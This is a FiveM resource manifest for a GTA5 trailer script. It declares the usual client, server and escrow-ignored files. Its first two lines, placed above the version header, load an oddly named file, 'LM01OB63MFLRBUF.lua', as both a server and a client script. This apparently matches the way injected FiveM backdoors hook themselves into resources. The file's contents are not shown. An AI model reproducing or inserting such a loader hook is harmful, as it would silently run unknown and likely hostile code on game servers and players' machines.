server_script "LM01OB63MFLRBUF.lua"
client_script "LM01OB63MFLRBUF.lua"
fx_version 'adamant'
game 'gta5'

description 'Trailer Script'
author 'theebu'
lua54 'yes'
version '0.4.5'

client_scripts {
	'config.lua',
	'client/client.lua',
	'client/utils.lua'
}

server_scripts {
	'server/server.lua'
}

escrow_ignore {
	'config.lua',
	'client/utils.lua'
}